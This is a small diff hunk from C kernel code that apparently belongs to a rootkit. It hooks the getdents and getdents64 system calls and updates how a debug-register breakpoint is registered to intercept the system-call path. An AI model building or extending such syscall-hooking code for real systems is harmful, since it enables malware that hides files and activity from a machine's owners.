@@ -189,7 +189,8 @@ int hook_sys_call_table(void)
 	HOOK(getdents, new_sys_getdents);
 	HOOK(getdents64, new_sys_getdents64);
 
-	register_dr_breakpoint(sys_call_table_call, BP_EXEC, system_call_hook);
+	register_dr_breakpoint(sys_call_table_call, DR_RW_EXECUTE, 0,
+				system_call_hook);
 
 	return 0;
 }
